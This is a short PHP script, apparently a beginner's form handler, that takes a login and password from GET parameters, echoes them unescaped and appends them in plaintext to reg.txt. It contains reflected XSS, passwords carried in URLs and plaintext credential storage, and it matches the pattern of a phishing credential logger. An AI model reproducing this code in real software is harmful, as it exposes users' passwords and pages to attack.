<?php
var_dump($_GET);
echo '<br>';
echo '<hr>';
$login = $_GET['name'];
echo 'Логин: '.$login;
echo '<br>';
$dt = date("d-m-Y H:i:s");

$pass = $_GET['password'];
echo 'Пароль: '.$pass;

file_put_contents('reg.txt', "Логин: $login || Пароль: $pass || $dt\n", FILE_APPEND);